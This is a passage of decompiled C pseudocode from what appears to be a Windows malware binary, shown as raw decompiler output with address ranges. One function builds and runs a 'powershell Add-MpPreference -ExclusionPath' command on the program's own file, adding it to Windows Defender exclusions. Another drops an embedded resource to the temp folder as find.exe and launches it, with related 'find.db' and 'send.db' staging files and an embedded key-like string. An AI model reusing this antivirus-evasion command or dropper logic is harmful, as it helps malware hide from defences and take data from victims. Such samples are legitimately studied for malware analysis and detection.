        result5 = *(int32_t *)v25;
    }
    // 0x416f75
    return result5;
}

// Address range: 0x416f80 - 0x417000
int32_t function_416f80(int32_t a1) {
    int32_t v1 = 20; // bp-20, 0x416f8f
    int32_t result; // 0x416f80
    *(int32_t *)(result + 16) = 5;
    *(int32_t *)(result + 8) = 5;
    int32_t * v2 = (int32_t *)(result + 12); // 0x416f98
    *v2 = 0;
    *(int32_t *)(result + 4) = function_406fa7();
    v1 = 40;
    *(int32_t *)(result + 20) = (int32_t)&g237;
    *(int32_t *)(result + 24) = 0;
    *(int32_t *)(result + 28) = 0;
    *(int32_t *)(result + 32) = 0;
    *(int32_t *)(result + 36) = 0;
    *(int32_t *)(result + 40) = 0;
    *(int32_t *)(result + 44) = 0;
    *(int32_t *)(result + 48) = 0;
    *(int32_t *)(result + 52) = 0;
    int32_t v3 = function_406fa7(); // 0x416fc5
    int32_t v4; // bp-16, 0x416f80
    int32_t * v5 = &v4; // 0x416fcc
    int32_t v6 = 0; // 0x416fcc
    if (v3 != 0) {
        // 0x416fce
        v1 = 40;
        v6 = function_4166fa(40);
        v5 = &v1;
    }
    // 0x416fda
    *(int32_t *)result = v6;
    function_41699c();
    if (*v2 == 0) {
        // 0x416ff6
        return result;
    }
    int32_t v7 = (int32_t)v5; // 0x416fe8
    for (int32_t i = 0; i < *v2; i++) {
        // 0x416fe8
        v7 -= 4;
        *(int32_t *)v7 = i;
        function_4167ca((int32_t)&g322);
    }
    // 0x416ff6
    return result;
}

// Address range: 0x417000 - 0x417004
int32_t function_417000(void) {
    // 0x417000
    int32_t v1; // 0x417000
    return *(int32_t *)(v1 + 20);
}

// Address range: 0x417004 - 0x417008
int32_t function_417004(void) {
    // 0x417004
    int32_t v1; // 0x417004
    return *(int32_t *)(v1 + 16);
}

// Address range: 0x417008 - 0x41700c
int32_t function_417008(void) {
    // 0x417008
    int32_t v1; // 0x417008
    return *(int32_t *)(v1 + 8);
}

// Address range: 0x41700c - 0x41700f
int32_t function_41700c(void) {
    // 0x41700c
    int32_t result; // 0x41700c
    return result;
}

// Address range: 0x41700f - 0x417022
int32_t function_41700f(void) {
    // 0x41700f
    function_406f1d();
    return function_406f1d();
}

// Address range: 0x417022 - 0x41705f
int32_t function_417022(int32_t a1) {
    int32_t * v1 = (int32_t *)a1; // 0x417030
    int32_t v2 = *(int32_t *)*v1; // 0x417032
    function_4043c7(function_415dc4(v2));
    function_406f1d();
    int32_t result = *(int32_t *)(v2 + 4 + *v1); // 0x417052
    int32_t v3; // 0x417022
    *(int32_t *)(v3 + 4) = result;
    return result;
}

// Address range: 0x41705f - 0x417076
int32_t function_41705f(int32_t a1, int32_t a2) {
    // 0x41705f
    int32_t v1; // 0x41705f
    *(int32_t *)v1 = (int32_t)&g127;
    int32_t result = function_406f1d(); // 0x41706b
    *(int32_t *)(v1 + 8) = 0;
    return result;
}

// Address range: 0x417076 - 0x417083
int32_t function_417076(void) {
    // 0x417076
    int32_t result; // 0x417076
    *(int32_t *)(result + 8) = 0;
    *(int32_t *)result = (int32_t)&g127;
    return result;
}

// Address range: 0x417083 - 0x417105
int32_t function_417083(void) {
    int32_t lpFilename = function_401000(256); // 0x417090
    int32_t v1 = function_401000(256); // 0x41709b
    function_401293((int32_t *)lpFilename, 0, 256);
    function_401293((int32_t *)v1, 0, 256);
    GetModuleFileNameA(NULL, (char *)lpFilename, 256);
    char * lpCmdLine = (char *)v1; // 0x4170ce
    __asm_rep_movsd_memcpy(lpCmdLine, "powershell Add-MpPreference -ExclusionPath ", 10);
    *(int16_t *)(v1 + 43) = *(int16_t *)lpFilename;
    *(char *)(v1 + 45) = *(char *)(lpFilename + 2);
    int32_t v2 = v1; // 0x4170e2
    char * v3 = (char *)v2;
    v2++;
    while (*v3 != 0) {
        // 0x4170e5
        v3 = (char *)v2;
        v2++;
    }
    // 0x4170ec
    *v3 = *(char *)(lpFilename + 255);
    return WinExec(lpCmdLine, 0);
}

// Address range: 0x417105 - 0x41711c
int32_t function_417105(int32_t a1, int32_t a2) {
    // 0x417105
    int32_t v1; // 0x417105
    *(int32_t *)v1 = (int32_t)&g128;
    int32_t result = function_406f1d(); // 0x417111
    *(int32_t *)(v1 + 8) = 0;
    return result;
}

// Address range: 0x41711c - 0x417153
int32_t function_41711c(int32_t a1) {
    int32_t * v1 = (int32_t *)a1; // 0x417128
    int32_t v2; // 0x41711c
    *(int32_t *)(v2 + 4) = *(int32_t *)*v1;
    function_4043c7(function_415dc4(*(int32_t *)(*v1 + 4)));
    return function_406f1d();
}

// Address range: 0x417153 - 0x417160
int32_t function_417153(void) {
    // 0x417153
    int32_t result; // 0x417153
    *(int32_t *)(result + 8) = 0;
    *(int32_t *)result = (int32_t)&g128;
    return result;
}

// Address range: 0x417160 - 0x4172da
int32_t function_417160(int32_t a1) {
    // 0x417160
    int128_t v1; // 0x417160
    int128_t v2 = v1;
    int32_t * hResInfo = (int32_t *)a1; // 0x41716f
    function_4043c7(function_415dc4(*(int32_t *)*hResInfo));
    function_406f1d();
    int32_t * hResData = LoadResource(NULL, hResInfo); // 0x41719b
    int32_t nNumberOfBytesToWrite = SizeofResource(NULL, hResInfo); // 0x4171a7
    int32_t * lpBuffer3 = LockResource(hResData); // 0x4171b1
    int32_t lpBuffer; // bp-1096, 0x417160
    function_401293(&lpBuffer, 0, 1024);
    int32_t lpBuffer2; // bp-2120, 0x417160
    function_401293(&lpBuffer2, 0, 1024);
    GetTempPathA(1024, (char *)&lpBuffer);
    lstrcatA((char *)&lpBuffer, "find.exe");
    GetTempPathA(1024, (char *)&lpBuffer2);
    lstrcatA((char *)&lpBuffer2, "find.db");
    int32_t * fileHandle = CreateFileA((char *)&lpBuffer, 0x10000000, 1, NULL, 2, 132, NULL); // 0x417236
    int32_t lpNumberOfBytesWritten; // bp-12, 0x417160
    WriteFile(fileHandle, lpBuffer3, nNumberOfBytesToWrite, &lpNumberOfBytesWritten, NULL);
    CloseHandle(fileHandle);
    int32_t lpOut; // bp-3144, 0x417160
    function_401293(&lpOut, 0, 1024);
    int32_t v3; // 0x417160
    int32_t v4 = *(int32_t *)(v3 + 4); // 0x417271
    wsprintfA((char *)&lpOut, "-w %ws -d C -f %s", v4, &lpBuffer2);
    int128_t v5 = __asm_xorps(v2, v2); // 0x4172a5
    int64_t v6; // 0x417160
    __asm_movlpd(v6, v5);
    __asm_movlpd(v6, v5);
    __asm_movlpd(v6, v5);
    return ShellExecuteExA(NULL);
}

// Address range: 0x4172da - 0x4172f1
int32_t function_4172da(int32_t a1, int32_t a2) {
    // 0x4172da
    int32_t v1; // 0x4172da
    *(int32_t *)v1 = (int32_t)&g129;
    int32_t result = function_406f1d(); // 0x4172e6
    *(int32_t *)(v1 + 4) = 0;
    return result;
}

// Address range: 0x4172f1 - 0x4172fe
int32_t function_4172f1(void) {
    // 0x4172f1
    int32_t result; // 0x4172f1
    *(int32_t *)(result + 4) = 0;
    *(int32_t *)result = (int32_t)&g129;
    return result;
}

// Address range: 0x4172fe - 0x41739a
int32_t function_4172fe(int32_t result) {
    // 0x4172fe
    int128_t v1; // 0x4172fe
    int128_t v2 = v1;
    int32_t lpBuffer; // bp-2080, 0x4172fe
    function_401293(&lpBuffer, 0, 1024);
    GetTempPathW(1024, (int16_t *)&lpBuffer);
    lstrcatW((int16_t *)&lpBuffer, L"send.db");
    int32_t v3 = function_40460a((int16_t *)&lpBuffer); // 0x41734f
    function_4043c7(v3);
    function_406f1d();
    __asm_movups(v1, __asm_xorps(v2, v2));
    function_404788((int32_t)&g322);
    function_4046da(result);
    function_4046c6();
    return result;
}

// Address range: 0x41739a - 0x4173b1
int32_t function_41739a(void) {
    // 0x41739a
    int32_t v1; // 0x41739a
    *(int32_t *)v1 = (int32_t)&g130;
    int32_t result = function_406f1d(); // 0x4173a6
    *(int32_t *)(v1 + 4) = 0;
    return result;
}

// Address range: 0x4173b1 - 0x4173be
int32_t function_4173b1(void) {
    // 0x4173b1
    int32_t result; // 0x4173b1
    *(int32_t *)(result + 4) = 0;
    *(int32_t *)result = (int32_t)&g130;
    return result;
}

// Address range: 0x4173be - 0x4174a1
int32_t function_4173be(int32_t result) {
    // 0x4173be
    int128_t v1; // 0x4173be
    int128_t v2 = v1;
    int32_t v3; // bp-112, 0x4173be
    int32_t v4 = &v3; // 0x4173c9
    __asm_movups(v1, __asm_xorps(v2, v2));
    int32_t v5; // 0x4173be
    int32_t * v6 = (int32_t *)(v5 + 12); // 0x4173e2
    int32_t v7 = 0; // 0x4173e5
    if (*v6 == 0) {
        // 0x417480
        *(int32_t *)(v4 - 4) = result;
        function_4046da((int32_t)&g322);
        function_4046c6();
        return result;
    }
    int32_t v8 = v4;
    *(int32_t *)(v8 - 4) = v7;
    *(int32_t *)(v8 - 8) = v8 + 16;
    int32_t v9 = function_402a03((int32_t)&g322, (int32_t)&g322); // 0x4173f6
    *(int32_t *)(v8 - 12) = v9;
    function_404788((int32_t)&g322);
    function_4015d4();
    *(int32_t *)(v8 - 16) = v7;
    *(int32_t *)(v8 - 20) = v8 + 20;
    int32_t v10 = function_402a03((int32_t)&g322, (int32_t)&g322); // 0x417416
    *(int32_t *)(v8 - 24) = v10 + 4;
    function_404788((int32_t)&g322);
    function_4015d4();
    *(int32_t *)(v8 - 28) = v7;
    *(int32_t *)(v8 - 32) = v8 + 24;
    int32_t v11 = function_402a03((int32_t)&g322, (int32_t)&g322); // 0x417439
    *(int32_t *)(v8 - 36) = v11 + 8;
    function_404788((int32_t)&g322);
    function_4015d4();
    *(int32_t *)(v8 - 40) = v7;
    *(int32_t *)(v8 - 44) = v8 + 28;
    int32_t v12 = function_402a03((int32_t)&g322, (int32_t)&g322); // 0x41745c
    int32_t v13 = v8 - 48; // 0x417465
    *(int32_t *)v13 = *(int32_t *)(v12 + 12);
    function_404767((int32_t)&g322);
    function_4015d4();
    v7++;
    while (v7 < *v6) {
        // 0x4173ee
        v8 = v13;
        *(int32_t *)(v8 - 4) = v7;
        *(int32_t *)(v8 - 8) = v8 + 16;
        v9 = function_402a03((int32_t)&g322, (int32_t)&g322);
        *(int32_t *)(v8 - 12) = v9;
        function_404788((int32_t)&g322);
        function_4015d4();
        *(int32_t *)(v8 - 16) = v7;
        *(int32_t *)(v8 - 20) = v8 + 20;
        v10 = function_402a03((int32_t)&g322, (int32_t)&g322);
        *(int32_t *)(v8 - 24) = v10 + 4;
        function_404788((int32_t)&g322);
        function_4015d4();
        *(int32_t *)(v8 - 28) = v7;
        *(int32_t *)(v8 - 32) = v8 + 24;
        v11 = function_402a03((int32_t)&g322, (int32_t)&g322);
        *(int32_t *)(v8 - 36) = v11 + 8;
        function_404788((int32_t)&g322);
        function_4015d4();
        *(int32_t *)(v8 - 40) = v7;
        *(int32_t *)(v8 - 44) = v8 + 28;
        v12 = function_402a03((int32_t)&g322, (int32_t)&g322);
        v13 = v8 - 48;
        *(int32_t *)v13 = *(int32_t *)(v12 + 12);
        function_404767((int32_t)&g322);
        function_4015d4();
        v7++;
    }
    // 0x417480
    *(int32_t *)(v13 - 4) = result;
    function_4046da((int32_t)&g322);
    function_4046c6();
    return result;
}

// Address range: 0x4174a1 - 0x4174af
int32_t function_4174a1(int32_t a1, int32_t a2) {
    // 0x4174a1
    int32_t v1; // 0x4174a1
    *(int32_t *)v1 = (int32_t)&g131;
    return function_40295e();
}

// Address range: 0x4174af - 0x4174cd
int32_t function_4174af(int32_t a1) {
    // 0x4174af
    int32_t result; // 0x4174af
    *(int32_t *)result = (int32_t)&g131;
    function_402917(a1);
    return result;
}

// Address range: 0x4174cd - 0x417755
int32_t function_4174cd(int32_t a1, int32_t a2) {
    // 0x417739
    function_406ca5();
    function_4154ca();
    function_401028(GetTickCount());
    int32_t lpFilename; // bp-1384, 0x4174cd
    GetModuleFileNameA(NULL, (char *)&lpFilename, 260);
    function_415e27();
    function_414e90();
    function_406ccd();
    return 0;
}

// Address range: 0x417755 - 0x417758
int32_t function_417755(void) {
    // 0x417755
    int32_t result; // 0x417755
    return result;
}

// Address range: 0x417758 - 0x41775f
int32_t function_417758(void) {
    // 0x417758
    int32_t result; // 0x417758
    *(int32_t *)result = (int32_t)&g132;
    return result;
}

// Address range: 0x41775f - 0x417768
int32_t function_41775f(void) {
    // 0x41775f
    int32_t result; // 0x41775f
    *(int32_t *)result = (int32_t)&g132;
    return result;
}

// Address range: 0x417768 - 0x4177fe
int32_t function_417768(int32_t result) {
    // 0x417768
    int128_t v1; // 0x417768
    int128_t v2 = v1;
    int32_t lpString1; // bp-552, 0x417768
    function_401293(&lpString1, 0, 520);
    SHGetFolderPathW(NULL, 28, NULL, 0, (int16_t *)&lpString1);
    lstrcatW((int16_t *)&lpString1, (int16_t *)&g16);
    function_4043fa((int16_t *)&lpString1);
    __asm_movups(v1, __asm_xorps(v2, v2));
    function_404788((int32_t)&g322);
    function_4046da(result);
    function_4046c6();
    function_406f1d();
    return result;
}

// Address range: 0x4177fe - 0x417805
int32_t function_4177fe(void) {
    // 0x4177fe
    int32_t result; // 0x4177fe
    *(int32_t *)result = (int32_t)&g133;
    return result;
}

// Address range: 0x417805 - 0x41780e
int32_t function_417805(void) {
    // 0x417805
    int32_t result; // 0x417805
    *(int32_t *)result = (int32_t)&g133;
    return result;
}

// Address range: 0x41780e - 0x417982
int32_t function_41780e(int32_t * a1, int32_t a2, int32_t a3) {
    int32_t result = (int32_t)a1;
    int32_t v1; // bp-24, 0x41780e
    int32_t v2 = &v1; // 0x417817
    int32_t v3; // bp-16, 0x41780e
    int32_t v4; // bp-32, 0x41780e
    int32_t v5; // 0x41780e
    switch (a3) {
        case 0: {
            // 0x41794d
            if (*(int32_t *)(v5 + 24) == 0) {
                // 0x417952
                v3 = &g37;
                function_405f32(&v3);
                v4 = a2;
                function_413ada(a2);
            }
            // 0x417972
            function_404094((int32_t)&g322);
            // 0x41797d
            return result;
        }
        case 1: {
            int32_t v6 = v2; // 0x417920
            if (*(int32_t *)(v5 + 52) == 0) {
                // 0x417922
                v3 = &g37;
                function_405f32(&v3);
                v4 = a2;
                function_413ada(a2);
                v6 = &v4;
            }
            // 0x41788a
            *(int32_t *)(v6 - 4) = v5 + 28;
            // 0x417972
            function_404094((int32_t)&g322);
            // 0x41797d
            return result;
        }
        case 2: {
            int32_t v7 = v2; // 0x4178f0
            if (*(int32_t *)(v5 + 80) == 0) {
                // 0x4178f2
                v3 = &g37;
                function_405f32(&v3);
                v4 = a2;
                function_413ada(a2);
                v7 = &v4;
            }
            // 0x41788a
            *(int32_t *)(v7 - 4) = v5 + 56;
            // 0x417972
            function_404094((int32_t)&g322);
            // 0x41797d
            return result;
        }
        case 3: {
            int32_t v8 = v2; // 0x4178c3
            if (*(int32_t *)(v5 + 108) == 0) {
                // 0x4178c5
                v3 = &g37;
                function_405f32(&v3);
                v4 = a2;
                function_413ada(a2);
                v8 = &v4;
            }
            // 0x41788a
            *(int32_t *)(v8 - 4) = v5 + 84;
            // 0x417972
            function_404094((int32_t)&g322);
            // 0x41797d
            return result;
        }
        case 4: {
            int32_t v9 = v2; // 0x417896
            if (*(int32_t *)(v5 + 136) == 0) {
                // 0x417898
                v3 = &g37;
                function_405f32(&v3);
                v4 = a2;
                function_413ada(a2);
                v9 = &v4;
            }
            // 0x41788a
            *(int32_t *)(v9 - 4) = v5 + 112;
            // 0x417972
            function_404094((int32_t)&g322);
            // 0x41797d
            return result;
        }
        case 5: {
            int32_t v10 = v2; // 0x41785c
            if (*(int32_t *)(v5 + 164) == 0) {
                // 0x41785e
                v3 = &g37;
                function_405f32(&v3);
                v4 = a2;
                function_413ada(a2);
                v10 = &v4;
            }
            // 0x41788a
            *(int32_t *)(v10 - 4) = v5 + 140;
            // 0x417972
            function_404094((int32_t)&g322);
            // 0x41797d
            return result;
        }
    }
    // 0x417849
    *a1 = 0;
    *(int32_t *)(result + 4) = 0;
    // 0x41797d
    return result;
}

// Address range: 0x417982 - 0x4179b8
int32_t function_417982(void) {
    // 0x417982
    function_402f9a();
    function_402f9a();
    function_402f9a();
    function_402f9a();
    function_402f9a();
    return function_402f9a();
}

// Address range: 0x4179b8 - 0x417bbe
int32_t function_4179b8(int32_t a1) {
    // 0x4179b8
    int32_t v1; // 0x4179b8
    int32_t v2 = v1;
    function_404094(a1 + 12);
    int32_t v3 = *(int32_t *)(a1 + 4); // 0x4179cf
    switch (v3) {
        case 0: {
            int32_t v4 = g196; // 0x417b6a
            int32_t * v5 = (int32_t *)(a1 + 8); // 0x417b73
            uint32_t v6 = *v5; // 0x417b73
            function_403fc7(v1, v4 + v2 > v6 ? v6 - v4 : v2);
            if (g196 < *v5) {
                // 0x417bb0
                return function_404081();
            }
            // 0x417b9a
            g201 = 1;
            // 0x417baa
            SetEvent((int32_t *)g197);
            // 0x417bb0
            return function_404081();
        }
        case 1: {
            int32_t v7 = g203; // 0x417b28
            int32_t * v8 = (int32_t *)(a1 + 8); // 0x417b31
            uint32_t v9 = *v8; // 0x417b31
            function_403fc7(v1, v7 + v2 > v9 ? v9 - v7 : v2);
            if (g203 < *v8) {
                // 0x417bb0
                return function_404081();
            }
            // 0x417b58
            g208 = 1;
            // 0x417baa
            SetEvent((int32_t *)g204);
            // 0x417bb0
            return function_404081();
        }
        case 2: {
            int32_t v10 = g210; // 0x417adf
            int32_t * v11 = (int32_t *)(a1 + 8); // 0x417ae8
            uint32_t v12 = *v11; // 0x417ae8
            function_403fc7(v1, v10 + v2 > v12 ? v12 - v10 : v2);
            if (g210 < *v11) {
                // 0x417bb0
                return function_404081();
            }
            // 0x417b13
            g215 = 1;
            // 0x417baa
            SetEvent((int32_t *)g211);
            // 0x417bb0
            return function_404081();
        }
        case 3: {
            int32_t v13 = g217; // 0x417a96
            int32_t * v14 = (int32_t *)(a1 + 8); // 0x417a9f
            uint32_t v15 = *v14; // 0x417a9f
            function_403fc7(v1, v13 + v2 > v15 ? v15 - v13 : v2);
            if (g217 < *v14) {
                // 0x417bb0
                return function_404081();
            }
            // 0x417aca
            g222 = 1;
            // 0x417baa
            SetEvent((int32_t *)g218);
            // 0x417bb0
            return function_404081();
        }
    }
    int32_t v16 = v3 - 4; // 0x4179f6
    if (v16 == 0) {
        int32_t v17 = g224; // 0x417a4d
        int32_t * v18 = (int32_t *)(a1 + 8); // 0x417a56
        uint32_t v19 = *v18; // 0x417a56
        function_403fc7(v1, v17 + v2 > v19 ? v19 - v17 : v2);
        if (g224 < *v18) {
            // 0x417bb0
            return function_404081();
        }
        // 0x417a81
        g229 = 1;
        // 0x417baa
        SetEvent((int32_t *)g225);
        // 0x417bb0
        return function_404081();
    }
    if (v16 != 1) {
        // 0x417bb0
        return function_404081();
    }
    int32_t v20 = g231; // 0x417a04
    int32_t * v21 = (int32_t *)(a1 + 8); // 0x417a0d
    uint32_t v22 = *v21; // 0x417a0d
    function_403fc7(v1, v20 + v2 > v22 ? v22 - v20 : v2);
    if (g231 < *v21) {
        // 0x417bb0
        return function_404081();
    }
    // 0x417a38
    g236 = 1;
    // 0x417baa
    SetEvent((int32_t *)g232);
    // 0x417bb0
    return function_404081();
}

// Address range: 0x417bbe - 0x417dc1
int32_t function_417bbe(void) {
    // 0x417bbe
    g195 = 0;
    g196 = 0;
    g198 = 0;
    g197 = 0;
    g199 = 0;
    g200 = 0;
    g202 = 0;
    g203 = 0;
    g205 = 0;
    g204 = 0;
    g206 = 0;
    g207 = 0;
    g209 = 0;
    g210 = 0;
    g212 = 0;
    g211 = 0;
    g213 = 0;
    g214 = 0;
    g216 = 0;
    g217 = 0;
    g219 = 0;
    g218 = 0;
    g220 = 0;
    g221 = 0;
    g223 = 0;
    g224 = 0;
    g226 = 0;
    g225 = 0;
    g227 = 0;
    g228 = 0;
    g230 = 0;
    g231 = 0;
    g233 = 0;
    g232 = 0;
    g234 = 0;
    g235 = 0;
    g201 = 0;
    g208 = 0;
    g215 = 0;
    g222 = 0;
    g229 = 0;
    g236 = 0;
    int32_t v1 = function_401000(25); // 0x417c9d
    int32_t v2 = function_401000(25); // 0x417ca6
    int32_t v3 = function_401000(25); // 0x417caf
    int32_t v4 = function_401000(25); // 0x417cb8
    int32_t v5 = function_401000(25); // 0x417cc2
    int32_t v6 = function_401000(25); // 0x417ccc
    function_415c2e();
    function_415c2e();
    function_415c2e();
    function_415c2e();
    function_415c2e();
    function_415c2e();
    function_413aec(function_40434f((char *)v1));
    function_406f1d();
    function_413aec(function_40434f((char *)v2));
    function_406f1d();
    function_413aec(function_40434f((char *)v3));
    function_406f1d();
    function_413aec(function_40434f((char *)v4));
    function_406f1d();
    function_413aec(function_40434f((char *)v5));
    function_406f1d();
    function_413aec(function_40434f((char *)v6));
    function_406f1d();
    return &g195;
}

// Address range: 0x417dc1 - 0x417dd2
int32_t function_417dc1(int32_t a1) {
    int32_t result = *(int32_t *)*(int32_t *)a1; // 0x417dc9
    int32_t v1; // 0x417dc1
    *(int32_t *)(v1 + 4) = result;
    return result;
}

// Address range: 0x417dd2 - 0x417dd9
int32_t function_417dd2(void) {
    // 0x417dd2
    int32_t result; // 0x417dd2
    *(int32_t *)result = (int32_t)&g134;
    return result;
}

// Address range: 0x417dd9 - 0x417de2
int32_t function_417dd9(void) {
    // 0x417dd9
    int32_t result; // 0x417dd9
    *(int32_t *)result = (int32_t)&g134;
    return result;
}

// Address range: 0x417de2 - 0x417de6
int32_t function_417de2(void) {
    // 0x417de2
    int32_t v1; // 0x417de2
    return *(int32_t *)(v1 + 4);
}

// Address range: 0x417de6 - 0x417de9
int32_t function_417de6(void) {
    // 0x417de6
    int32_t result; // 0x417de6
    return result;
}

// Address range: 0x417de9 - 0x417df0
int32_t function_417de9(void) {
    // 0x417de9
    int32_t result; // 0x417de9
    *(int32_t *)result = (int32_t)&g135;
    return result;
}

// Address range: 0x417df0 - 0x417df9
int32_t function_417df0(void) {
    // 0x417df0
    int32_t result; // 0x417df0
    *(int32_t *)result = (int32_t)&g135;
    return result;
}

// Address range: 0x417df9 - 0x417e48
int32_t function_417df9(int32_t a1, int32_t a2) {
    // 0x417df9
    int32_t v1; // 0x417df9
    int32_t * v2 = (int32_t *)(v1 + 8); // 0x417e00
    if (*v2 != 0) {
        // 0x417e2e
        return 1;
    }
    // 0x417e07
    function_417e48();
    int32_t v3 = function_4147a3(); // 0x417e11
    *(int32_t *)(v1 + 20) = v3;
    if (v3 != 0) {
        // 0x417e1d
        *v2 = function_41473a();
    }
    // 0x417e2e
    return 1;
}

// Address range: 0x417e48 - 0x417fd8
int32_t function_417e48(void) {
    // 0x417e48
    int32_t v1; // bp-1180, 0x417e48
    function_401293(&v1, 0, 1032);
    __asm_movups(0, __asm_movaps_1(g138));
    int32_t v2 = 0; // bp-8, 0x417e83
    int128_t v3; // 0x417e48
    __asm_movups(v3, __asm_movaps_1(g141));
    __asm_movups(v3, __asm_movaps_1(g139));
    __asm_movups(v3, __asm_movaps_1(g144));
    __asm_movups(v3, __asm_movaps_1(g143));
    __asm_movups(v3, __asm_movaps_1(g145));
    __asm_movups(v3, __asm_movaps_1(g140));
    __asm_movups(v3, __asm_movaps_1(g142));
    int128_t v4; // bp-148, 0x417e48
    __asm_rep_movsd_memcpy((char *)&v1, (char *)&v4, 32);
    int32_t v5; // 0x417e48
    int32_t v6 = *(int32_t *)(v5 + 28); // 0x417ef0
    int32_t v7 = *(int32_t *)(v5 + 24); // 0x417ef3
    function_40820b(1, 1);
    function_418056(v7, v6);
    char v8 = *(char *)(v7 + 3); // 0x417f57
    char v9 = *(char *)(v7 + 2); // 0x417f67
    char v10 = *(char *)(v7 + 1); // 0x417f7b
    char v11 = *(char *)v7; // 0x417f87
    int32_t v12 = function_401000(v6); // 0x417f95
    function_407e70(&v1, v12, 256 * (256 * (256 * (int32_t)v8 | (int32_t)v9) | (int32_t)v10) | (int32_t)v11, &v2);
    function_415e92();
    return function_415ede((int32_t *)"BQAaR$43!QAFff");
}

// Address range: 0x417fd8 - 0x417ff3
int32_t function_417fd8(void) {
    // 0x417fd8
    int32_t v1; // 0x417fd8
    function_403eca((int32_t)&v1);
    return function_404081();
}

// Address range: 0x417ff3 - 0x418056
int32_t function_417ff3(int32_t a1) {
    int32_t v1 = 4; // bp-28, 0x418004
    int32_t v2; // bp-16, 0x417ff3
    function_41780e(&v2, *(int32_t *)(a1 + 8), 4);
    int32_t result = 0; // 0x418017
    int32_t v3; // 0x417ff3
    if (v3 != 0) {
        // 0x41801d
        function_404094((int32_t)&v1);
        function_417fd8();
        int32_t v4 = *(int32_t *)a1; // 0x418034
        function_417df9(*(int32_t *)v4, *(int32_t *)(v4 + 4));
        result = 1;
    }
    // 0x418043
    function_404081();
    return result;
}

// Address range: 0x418056 - 0x4180c4
int32_t function_418056(int32_t result, int32_t a2) {
    int32_t * memoryHandle = LocalAlloc(64, 256); // 0x41806a
    int32_t v1; // bp-268, 0x418056
    function_401293(&v1, 0, 242);
    function_4024bb(result);
    LocalFree(memoryHandle);
    return result;
}

// Address range: 0x4180c4 - 0x418108
int32_t function_4180c4(int32_t a1, int32_t a2, int32_t a3) {
    int32_t v1 = function_406f77(); // 0x4180ca
    *(int32_t *)(v1 + 8) = a1;
    int32_t * v2 = (int32_t *)v1; // 0x4180de
    *v2 = (int32_t)&g242;
    *(int32_t *)(v1 + 4) = (int32_t)&g195;
    g242 = a2;
    g243 = a3;
    return function_402746(0x417ff3, v2);
}

// Address range: 0x418108 - 0x418129
int32_t function_418108(void) {
    // 0x418108
    int128_t v1; // 0x418108
    int128_t v2 = v1;
    g244 = 0;
    g245 = 0;
    g246 = 0;
    __asm_movups(g242, __asm_xorps(v2, v2));
    return &g242;
}

// Address range: 0x418129 - 0x418134
int32_t function_418129(void) {
    // 0x418129
    *(int32_t *)&g150 = (int32_t)&g116;
    int32_t result; // 0x418129
    return result;
}

// Address range: 0x418134 - 0x41813e
int32_t function_418134(void) {
    // 0x418134
    return function_416233();
}

// Address range: 0x41813e - 0x418148
int32_t function_41813e(void) {
    // 0x41813e
    return function_417982();
}

// Address range: 0x418148 - 0x418152
int32_t function_418148(void) {
    // 0x418148
    return function_4101de();
}

// Address range: 0x418152 - 0x41815c
int32_t function_418152(void) {
    // 0x418152
    return function_40bcc7();
}

// Address range: 0x41815c - 0x418166
int32_t function_41815c(void) {
    // 0x41815c
    return function_411ec1();
}

// Address range: 0x418166 - 0x418170
int32_t function_418166(void) {
    // 0x418166
    return function_4013fd();
}

// Address range: 0x418170 - 0x41817a
int32_t function_418170(void) {
    // 0x418170
    return function_410c44();
}

// Address range: 0x41817a - 0x418184
int32_t function_41817a(void) {
    // 0x41817a
    return function_41405b();
}

// Address range: 0x418184 - 0x41818e
int32_t function_418184(void) {
    // 0x418184
    return function_404081();
}

// --------------------- Meta-Information ---------------------

// Detected compiler/packer: microsoft
// Detected functions: 865

